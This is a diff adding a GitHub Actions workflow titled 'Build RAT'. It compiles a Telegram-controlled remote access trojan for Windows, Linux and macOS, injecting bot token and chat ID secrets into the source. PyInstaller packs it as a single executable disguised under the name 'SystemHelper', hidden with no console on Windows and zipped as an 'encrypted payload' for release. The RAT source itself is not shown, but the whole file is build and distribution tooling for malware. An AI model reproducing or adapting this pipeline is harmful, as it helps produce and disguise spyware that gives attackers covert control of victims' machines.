@@ -1,0 +1,134 @@
+ name: Build RAT
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:  # Ручной запуск
+
+jobs:
+  build-windows:
+    runs-on: windows-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+    
+    - name: Setup Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.9'
+        architecture: 'x64'
+    
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -r requirements.txt
+    
+    - name: Prepare source with secrets
+      run: |
+        $content = Get-Content src/rat_telegram.py -Raw
+        $content = $content -replace 'YOUR_BOT_TOKEN_HERE', '${{ secrets.BOT_TOKEN }}'
+        $content = $content -replace '123456789', '${{ secrets.TELEGRAM_ID }}'
+        Set-Content -Path src/rat_telegram_build.py -Value $content
+      shell: powershell
+    
+    - name: Build with PyInstaller
+      run: |
+        pyinstaller --onefile `
+        --noconsole `
+        --clean `
+        --exclude-module tkinter `
+        --exclude-module unittest `
+        --exclude-module pydoc `
+        --key="${{ secrets.ENCRYPTION_KEY }}" `
+        --name "SystemHelper" `
+        src/rat_telegram_build.py
+    
+    - name: Upload artifact
+      uses: actions/upload-artifact@v3
+      with:
+        name: Windows-RAT
+        path: dist/SystemHelper.exe
+    
+    - name: Create release with encrypted payload
+      if: github.ref == 'refs/heads/main'
+      run: |
+        Compress-Archive -Path dist/SystemHelper.exe -DestinationPath SystemHelper.zip
+        echo "RAT_BUILD_ID=${{ github.run_id }}" >> $env:GITHUB_ENV
+      shell: powershell
+
+  build-linux:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+    
+    - name: Setup Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.9'
+    
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -r requirements.txt
+    
+    - name: Prepare source with secrets
+      run: |
+        sed -i "s/YOUR_BOT_TOKEN_HERE/${{ secrets.BOT_TOKEN }}/g" src/rat_telegram.py
+        sed -i "s/123456789/${{ secrets.TELEGRAM_ID }}/g" src/rat_telegram.py
+    
+    - name: Build with PyInstaller
+      run: |
+        pyinstaller --onefile \
+        --clean \
+        --exclude-module tkinter \
+        --exclude-module unittest \
+        --name "SystemHelper" \
+        src/rat_telegram.py
+    
+    - name: Upload artifact
+      uses: actions/upload-artifact@v3
+      with:
+        name: Linux-RAT
+        path: dist/SystemHelper
+
+  build-macos:
+    runs-on: macos-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+    
+    - name: Setup Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.9'
+    
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -r requirements.txt
+    
+    - name: Prepare source with secrets
+      run: |
+        sed -i "" "s/YOUR_BOT_TOKEN_HERE/${{ secrets.BOT_TOKEN }}/g" src/rat_telegram.py
+        sed -i "" "s/123456789/${{ secrets.TELEGRAM_ID }}/g" src/rat_telegram.py
+    
+    - name: Build with PyInstaller
+      run: |
+        pyinstaller --onefile \
+        --clean \
+        --exclude-module tkinter \
+        --exclude-module unittest \
+        --name "SystemHelper" \
+        src/rat_telegram.py
+    
+    - name: Upload artifact
+      uses: actions/upload-artifact@v3
+      with:
+        name: macOS-RAT
+        path: dist/SystemHelper
